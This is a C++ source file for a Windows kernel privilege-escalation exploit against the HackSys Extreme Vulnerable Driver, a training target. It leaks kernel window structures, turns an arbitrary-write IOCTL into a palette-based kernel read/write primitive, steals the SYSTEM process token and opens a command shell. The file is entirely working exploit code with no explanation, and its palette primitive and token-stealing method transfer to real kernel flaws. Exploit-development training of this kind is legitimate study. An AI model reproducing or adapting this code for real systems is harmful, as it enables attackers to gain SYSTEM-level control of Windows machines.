#include<Windows.h>
#include<stdio.h>
#include<iostream>
#include<string>

#include "KrnlPwnLib.h"
#include "Krnltypes.h"

extern "C" int _stdcall Int_3();

#define HACKSYS_EVD_IOCTL_ARBITRARY_OBJECT CTL_CODE(FILE_DEVICE_UNKNOWN, 0X802, METHOD_NEITHER, FILE_ANY_ACCESS)

DWORD64 pFirstColorOffset = 0x78;

HPALETTE Manager_Palette = NULL;
HPALETTE Worker_Palette = NULL;

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

int readOOB(HPALETTE worker_palette, HPALETTE manager_palette, UINT64 target_address, BYTE* data, int size) {
	if (!manager_palette || !worker_palette) {
		LogMessage(L_ERROR, "Palettes not initialized yet!");
		return 0;
	}
	SetPaletteEntries(manager_palette,
		0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)& target_address);
	return GetPaletteEntries(worker_palette, 0, size / sizeof(PALETTEENTRY), (PALETTEENTRY*)data);
}

int writeOOB(HPALETTE worker_palette, HPALETTE manager_palette, UINT64 target_address, BYTE* data, int size){
	if (!manager_palette || !worker_palette) {
		LogMessage(L_ERROR, "Palettes not initialized yet!");
		return 0;
	}

	SetPaletteEntries(manager_palette,0, sizeof(PVOID) / sizeof(PALETTEENTRY), (PALETTEENTRY*)& target_address);
	SetPaletteEntries(worker_palette,0, size / sizeof(PALETTEENTRY), (PALETTEENTRY*)data);
	}

LRESULT CALLBACK MainWProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

void PopAShell() {
	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

}

int classNumber = 0;

DWORD64 allocate_free_window() {
	TCHAR lpszMenuName[0x7F0];
	memset(lpszMenuName, 0x41, sizeof(lpszMenuName));

	WNDCLASSEX wndClass = { 0 };
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.cbSize = sizeof(WNDCLASSEX);
	wndClass.cbWndExtra = 0;
	wndClass.lpszMenuName = lpszMenuName;

	std::string lpszClassName = "Class_" + std::to_string(classNumber);
	wndClass.lpszClassName = TEXT(lpszClassName.c_str());

	int result = RegisterClassEx(&wndClass);
	if (!result) {
		printf("[-] Error in RegisterClassEx ....Exiting");
		exit(-1);
	}
	
	HWND hWndOne = CreateWindowEx(
		0,
		wndClass.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL, NULL, NULL, NULL
	);

	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hWndOne, 1);
	DWORD64 UsertagWND = (DWORD64)tagWND;
	DWORD64 KerneltagWND = (DWORD64)(tagWND->pSelf);

	DWORD64 ulClientDelta = KerneltagWND - UsertagWND;

	DWORD64 KerneltagCLS = *(PDWORD64)(UsertagWND + 0xa8);
	DWORD64 tagCls_lpszMenuName = *(PDWORD64)(KerneltagCLS - ulClientDelta + 0x98);

	DestroyWindow(hWndOne);
	UnregisterClass(wndClass.lpszClassName, NULL);

	return tagCls_lpszMenuName;
}

DWORD64 allocate_free_windows() {
	DWORD64 prev_lpszMenuName = 0;

	while (1) {
		DWORD64 curr_lpszMenuName = allocate_free_window();
		if (prev_lpszMenuName == curr_lpszMenuName) {
			return curr_lpszMenuName;
		}
		prev_lpszMenuName = curr_lpszMenuName;
		classNumber++;
	}
}

HPALETTE createPaletteofSize() {
	int pal_cnt = (0x1000 - 0x90) / 4;
	int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);

	LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize);
	memset(lPalette, 0x4, palsize);

	lPalette->palNumEntries = pal_cnt;
	lPalette->palVersion = 0x300;

	return CreatePalette(lPalette);
}


int main()
{
	LogMessage(L_INFO, "*****Start WWW Exploit*****");

	BOOL bFound = FindHMValidateHandle();
	if (!bFound) {
		LogMessage(L_ERROR, "Failed to locate HmValidateHandle. ------Exiting------");
		return 1;
	}
	printf("\n[+] HmValidateHandle : 0x%p\n", pHmValidateHandle);


	LogMessage(L_INFO, "Creating Manager and Worker Palette....");


	DWORD64 lpszMenuNameAddr_Manager = allocate_free_windows();
	Manager_Palette = createPaletteofSize();
	if (!Manager_Palette) {
		LogMessage(L_ERROR, "Make Manager Palette failure........");
		return 0;
	}
	DWORD64 hManager_pFirstColor = lpszMenuNameAddr_Manager + 0x78;

	DWORD64 lpszMenuNameAddr_Worker = allocate_free_windows();
	Worker_Palette = createPaletteofSize();
	if (!Worker_Palette) {
		LogMessage(L_ERROR, "Make Manager Palette failure........");
		return 0;
	}
	DWORD64 hWorker_pFirstColor = lpszMenuNameAddr_Worker + 0x78;

	printf("\n[+] Manager Palette : 0x%p",Manager_Palette);
	printf("\n[+] Worker Palette :  0x%p",Worker_Palette);

	printf("\n[+] Manager pFirstColor Address : 0x%p", hManager_pFirstColor);
	printf("\n[+] Worker pFirstColor Address  : 0x%p", hWorker_pFirstColor);
	
	printf("\n");
	LogMessage(L_INFO, "Triggering HEVD Arbitrary OverWrite......");
	PWRITE_WHAT_WHERE WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(WRITE_WHAT_WHERE)
	);
	if (!WriteWhatWhere) {
		LogMessage(L_ERROR, "Failed To Allocate Memory: 0x%X", GetLastError());
		exit(-1);
	}
	LogMessage(L_INFO, "WriteWhatWhere Memory Allocated: 0x%p", WriteWhatWhere);

	LogMessage(L_INFO, "Overwrite Manager Palette pFirstColor : 0x%p \n   By value of Worker Palette pFirstColor : 0x%p", hManager_pFirstColor, hWorker_pFirstColor);

	WriteWhatWhere->Where = (PULONG_PTR)hManager_pFirstColor;
	WriteWhatWhere->What = (PULONG_PTR)&hWorker_pFirstColor;

	ULONG BytesReturned;

	HANDLE hDevice = open_device();
	bool sent_ioctl = NULL;
	sent_ioctl = DeviceIoControl(hDevice,
		HACKSYS_EVD_IOCTL_ARBITRARY_OBJECT,
		(LPVOID)WriteWhatWhere,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&BytesReturned,
		NULL);

	if (sent_ioctl == NULL) {
		LogMessage(L_WARN, "not able to send IOCTL. Exiting........");
		exit(-1);
	}


	LogMessage(L_INFO, "Leaking _EPROCESS by tagWND ...");
	WNDCLASSEX wndClassLeak = { 0 };
	wndClassLeak.lpfnWndProc = DefWindowProc;
	wndClassLeak.lpszClassName = TEXT("leakWND");
	wndClassLeak.lpszMenuName = TEXT("leakWND");
	wndClassLeak.cbSize = sizeof(WNDCLASSEX);

	int result = RegisterClassEx(&wndClassLeak);
	if (!result) {
		LogMessage(L_ERROR, "RegisterClassEx error: %d", GetLastError());
		exit(-1);
	}

	HWND hWnd_leak = CreateWindowEx(
		0,
		wndClassLeak.lpszClassName,
		TEXT("WORDS"),
		0,
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
		NULL, NULL, NULL, NULL);

	PTHRDESKHEAD tagWND = (PTHRDESKHEAD)pHmValidateHandle(hWnd_leak, 1);
	LogMessage(L_INFO, "tagWND->h.pti address is: 0x%p", (DWORD64)tagWND->h.pti);
	LogMessage(L_INFO, "tagWND address is: 0x%p", tagWND);
	
	DWORD64 _KTHREAD_kobj;
	readOOB(Worker_Palette, Manager_Palette, (DWORD64)tagWND->h.pti, (BYTE*)& _KTHREAD_kobj, sizeof(DWORD64));
	LogMessage(L_INFO, "_KTHREAD address is: 0x%p", (DWORD64)_KTHREAD_kobj);

	DWORD64 _KAPC_uobj = (DWORD64)_KTHREAD_kobj + 0x98;
	DWORD64 _KAPC_kobj = 0;
	readOOB(Worker_Palette, Manager_Palette,(DWORD64)_KAPC_uobj, (BYTE*)& _KAPC_kobj, sizeof(DWORD64));
	LogMessage(L_INFO, "[+] _KAPC_STAT address is: 0x%p", _KAPC_kobj);

	DWORD64 _EPROCESS_uobj = (DWORD64)_KAPC_kobj + 0x20;
	DWORD64 _EPROCESS_kobj = 0;
	readOOB(Worker_Palette, Manager_Palette,(DWORD64)_EPROCESS_uobj, (BYTE*)& _EPROCESS_kobj, sizeof(DWORD64));
	LogMessage(L_INFO, "[+]  Current _EPROCESS address is : 0x%p", _EPROCESS_kobj);

	DWORD64 _Current_Token = 0;
	DWORD64 _Current_Token_Address = _EPROCESS_kobj + 0x358;
	readOOB(Worker_Palette, Manager_Palette,(DWORD64)_Current_Token_Address, (BYTE*)& _Current_Token, sizeof(DWORD64));
	LogMessage(L_INFO, "[+] Current Process Token is: 0x%p", _Current_Token);
	LogMessage(L_INFO, "[+] Current Process Token at: 0x%p", _Current_Token_Address);

	DWORD dwUniqueProcessIdOffset = 0x2e0;
	DWORD dwTokenOffset = 0x358;
	DWORD dwActiveProcessLinks = 0x2e8;
	DWORD64 lpPreEPROCESS = NULL;
	DWORD64 lpCurrentProcID = NULL;
	LIST_ENTRY lePreProcessLink;
	DWORD64 lpSystemToken = NULL;
	DWORD dwCurrentPID;

	readOOB(Worker_Palette, Manager_Palette, _EPROCESS_kobj + dwUniqueProcessIdOffset, (BYTE*)& lpCurrentProcID, sizeof(DWORD64));
	readOOB(Worker_Palette, Manager_Palette, _EPROCESS_kobj + dwActiveProcessLinks, (BYTE*)& lePreProcessLink, sizeof(LIST_ENTRY));

	do {
		lpPreEPROCESS = (DWORD64)lePreProcessLink.Blink - dwActiveProcessLinks;

		readOOB(Worker_Palette, Manager_Palette, lpPreEPROCESS + dwUniqueProcessIdOffset, (BYTE*)& lpCurrentProcID, sizeof(DWORD64));
		readOOB(Worker_Palette, Manager_Palette, lpPreEPROCESS + dwTokenOffset, (BYTE*)& lpSystemToken, sizeof(DWORD64));

		readOOB(Worker_Palette, Manager_Palette, lpPreEPROCESS + dwActiveProcessLinks, (BYTE*)& lePreProcessLink, sizeof(LIST_ENTRY));

		dwCurrentPID = LOWORD(lpCurrentProcID);

	} while (dwCurrentPID != 0x4);

	writeOOB(Worker_Palette, Manager_Palette, _Current_Token_Address,(BYTE*)&lpSystemToken, sizeof(DWORD64));

	PopAShell();
	LogMessage(L_BLANK, "\n Just Paused for a bit");
	LogMessage(L_BLANK, "\n");
	LogMessage(L_INFO, "--------------------------- Reached End of WWW ------------------");
	return 0;
}